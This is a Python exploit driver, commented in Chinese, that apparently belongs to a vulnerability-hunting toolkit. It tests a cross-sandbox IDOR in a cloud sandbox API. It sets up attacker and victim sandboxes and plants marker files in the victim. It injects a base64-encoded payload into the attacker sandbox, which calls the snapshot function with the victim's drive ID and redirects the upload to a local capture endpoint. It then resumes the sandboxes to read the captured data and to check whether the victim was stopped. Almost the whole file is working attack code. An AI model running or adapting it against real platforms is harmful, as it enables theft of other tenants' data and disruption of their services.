# -*- coding: utf-8 -*-
"""v217 驱动: 跨沙箱 driveId IDOR + 上传捕获 (A 攻击者, B 受害者)
B 先写标记文件; A CreateSnapshot(driveId=B.sid, bucketBaseUrl=s3://127.0.0.1:18081)
观察 A/B 状态; resume A 读捕获文件"""
import sys, os, time, base64, json
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ, fresh_sandbox, cmd

NAME_A = 'v217a'
NAME_B = 'v217b'
PAY = r'D:\scan\skills\non-traditional-vuln-hunting\vda217_probe_user.py'


def inject(sid, dst, content):
    b64 = base64.b64encode(content if isinstance(content, bytes) else content.encode()).decode()
    s = "import base64;open('%s','wb').write(base64.b64decode('%s'))" % (dst, b64)
    c, r = cmd(sid, 'python3', ['-c', s], 60000)
    print('[inject %s]' % dst, c)
    return c


def get_status(name):
    c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, TEAM, PROJ))
    try:
        d = json.loads(r)
        sb = d.get('sandbox', {})
        return sb.get('status'), sb.get('currentSnapshotId'), sb.get('currentSessionId')
    except Exception:
        return None, None, None


def main():
    t0 = time.time()
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME_A, TEAM, PROJ))
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME_B, TEAM, PROJ))
    sidB = fresh_sandbox(NAME_B)
    print('[B created] %.0fs sidB=%s' % (time.time() - t0, sidB))

    # B 写标记文件 (验证快照内容是否含 B 数据)
    c, r = cmd(sidB, 'bash', ['-c', 'echo VICTIM-B-MARKER-217 > /tmp/victim_marker && echo VICTIM-B-MARKER-217 > /vercel/sandbox/victim_marker && echo VICTIM-B-MARKER-217 > /etc/victim_marker 2>/dev/null; ls -la /tmp/victim_marker /vercel/sandbox/victim_marker 2>&1'], 20000)
    print('[B marker]', c, (r or '')[:300])

    sidA = fresh_sandbox(NAME_A)
    print('[A created] %.0fs sidA=%s' % (time.time() - t0, sidA))

    inject(sidA, '/vercel/sandbox/vda217_probe_user.py', open(PAY, 'rb').read())

    c, r = cmd(sidA, 'python3', ['/vercel/sandbox/vda217_probe_user.py', sidB], 40000)
    print('[A run payload]', c)
    print((r or '')[:6000])

    time.sleep(2)
    stA, snapA, _ = get_status(NAME_A)
    stB, snapB, _ = get_status(NAME_B)
    print('[status] A=%s snapA=%s | B=%s snapB=%s' % (stA, snapA, stB, snapB))

    # resume A 读捕获文件
    if stA == 'stopped':
        c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s&resume=true' % (NAME_A, TEAM, PROJ))
        print('[resume A]', c)
        time.sleep(6)
        stA2, _, sessA2 = get_status(NAME_A)
        print('[A status2] %s' % stA2)
        if stA2 == 'running' and sessA2:
            c, r = cmd(sessA2, 'bash', ['-c', 'ls -la /vercel/sandbox/v217_* 2>&1; echo ---; for f in /vercel/sandbox/v217_*; do echo "== $f =="; head -c 1500 "$f" 2>/dev/null; echo; done'], 20000)
            print('[A read files]', c)
            print((r or '')[:10000])

    # resume B (若被 stop) 验证 B 数据
    if stB == 'stopped':
        print('[B was stopped! cross-sandbox DoS candidate]')
        c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s&resume=true' % (NAME_B, TEAM, PROJ))
        print('[resume B]', c, (r or '')[:200])
        time.sleep(6)
        stB2, _, sessB2 = get_status(NAME_B)
        if stB2 == 'running' and sessB2:
            c, r = cmd(sessB2, 'bash', ['-c', 'cat /tmp/victim_marker /vercel/sandbox/victim_marker 2>&1; echo ---; ls -la /tmp /vercel/sandbox 2>&1 | head -20'], 20000)
            print('[B verify]', c, (r or '')[:1000])

    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME_A, TEAM, PROJ))
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME_B, TEAM, PROJ))
    print('CLEANED total %.0fs' % (time.time() - t0))


if __name__ == '__main__':
    main()
